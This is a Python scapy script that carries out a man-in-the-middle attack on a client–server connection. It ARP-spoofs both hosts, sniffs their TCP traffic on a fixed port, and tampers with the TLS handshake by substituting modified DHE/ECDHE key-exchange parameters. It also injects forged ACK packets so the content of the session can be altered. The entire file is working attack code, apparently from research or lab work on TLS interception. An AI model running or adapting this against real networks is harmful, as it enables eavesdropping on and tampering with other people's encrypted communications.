from scapy.all import *
from test import *
from py_capture import Task
import queue
from multiprocessing import Process
from arpspoof import ARPSpoof
import multiprocessing as mp
import subprocess
import logging
import os

def arpspoof(interface, target, gateway):
    Process(target = ARPSpoof(interface, target, gateway).run, daemon=True).start()

def get_mac(ip, interface):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def do_sniff(sender, brf, iface):
    sniff(prn=sender, filter=brf, iface=iface)

class MITM:
    def __init__(self, client_ip, server_ip, server_port):
        self.client_ip = client_ip
        self.server_ip = server_ip 
        self.server_port = server_port
        self.task = Task(PktHandler())
        self.tls_queue = mp.Queue()
        self.tcp_queue = mp.Queue()
        self.client_mac = get_mac(self.client_ip, "eth0")
        self.server_mac = get_mac(self.server_ip, "eth1")
        self.eth0_mac = get_if_hwaddr("eth0")
        self.eth1_mac = get_if_hwaddr("eth1")

        arpspoof("eth0", self.client_ip, self.server_ip)
        arpspoof("eth1", self.server_ip, self.client_ip)

        self.client_sock = conf.L2socket(iface="eth0")
        self.server_sock = conf.L2socket(iface="eth1")
        self.SOCK = {
            self.client_ip: lambda data: self.client_sock.send(Ether(src = self.eth0_mac, dst=self.client_mac)/data),
            self.server_ip: lambda data: self.server_sock.send(Ether(src = self.eth1_mac, dst=self.server_mac)/data),
        }

    def run(self):
        cip = self.client_ip
        sip = self.server_ip
        sport = self.server_port

        # Enable worker, the packet must be executed in order.
        Process(target = self.tls_worker, daemon=True).start()
        Process(target = self.tcp_worker, daemon=True).start()

        # sniff on eth0 for intercepting client packets.
        c_bpf = f"tcp and (dst port {sport} and dst net {sip})"
        Process(target = do_sniff, daemon=True, args = (self.sender, c_bpf, "eth0",)).start()
        # sniff on eth1 for intercepting server packets.
        s_bpf = f"tcp and (src port {sport} and src net {sip})"
        p = Process(target = do_sniff, daemon=True, args = (self.sender, s_bpf, "eth1",))
        print("mitm started")
        p.start()
        p.join()

    def sender(self, pkt):
        ip = pkt.payload.payload
        if len(ip.payload) > 0:
            # TLS packet, need to process.
            self.tls_queue.put(pkt)
        else:
            # TCP packet, forward directly.
            self.tcp_queue.put(pkt)

    def tcp_worker(self):
        while True:
            pkt = self.tcp_queue.get()
            self.forward(pkt)

    def tls_worker(self):
        while True:
            pkt = self.tls_queue.get()
            self.parse(pkt)

    def forward(self, pkt):
        # recalculate headers checksum.
        del pkt.payload.payload.chksum
        del pkt.payload.chksum
        del pkt.payload.len
        data = IP(bytes(pkt.payload))

        # fake layer-3 IP, modify Ether layer in the lambda calculus.
        self.SOCK[pkt.payload.dst](data)
        
    def parse(self, pkt):
        tcp_data = bytes(pkt.payload.payload)
        seq = self.task.get_seq()
        logging.debug("current seq num is: " + str(seq))

        (state, isdhe) = self.task.handler.handle_packet(tcp_data)

        if state == TASKSTATE.BLOCK.value:
            return

        elif isdhe:
            """
            DHE: need to build connection between server & client.
            from server key exchange, we know the DHE-key-cipher, and send 
            ECDHE param to client, then get the response.
            Store the param of the response from the client, modify the 
            content of the param, then forward it to the server.
            Then insert the derived ecdhe param to the parser.
            """
            tls_data = self.task.handler.MODIFIED_TLS_DHE
            del pkt.payload.payload.payload
            logging.debug("forwarded bytes: " + tls_data.hex() + " cur state: " + str(state))
            pkt = pkt / tls_data

        if state == TASKSTATE.ClientKeyExchange.value:
            self.task.increase()
        elif state == TASKSTATE.NewSessionTicket.value:
            self.task.increase()
        elif state == TASKSTATE.COMMUNICATION.value:
            # send ack back to enable sizable packet content tamper.
            ack = pkt.copy()
            eth = ack 
            ip = ack.payload

            ack.src, ack.dst = eth.dst, eth.src
            ack.payload.src, ack.payload.dst = ip.dst, ip.src
            del ack.payload.payload

            ack = ack / TCP(self.task.handler.MODIFIED_TCP)
            self.tcp_queue.put(ack)
            ack.show()
            self.task.increase()
        elif state == TASKSTATE.PASS.value:
            # already visited, retransmit; if no, the extended key derive will failed.
            self.tcp_queue.put(pkt)
            return

        self.tcp_queue.put(pkt)

if __name__ == "__main__":
    # client ip, server ip, server port.
    mitm = MITM("169.254.127.207", "169.254.137.152", 2333)
    mitm.run()
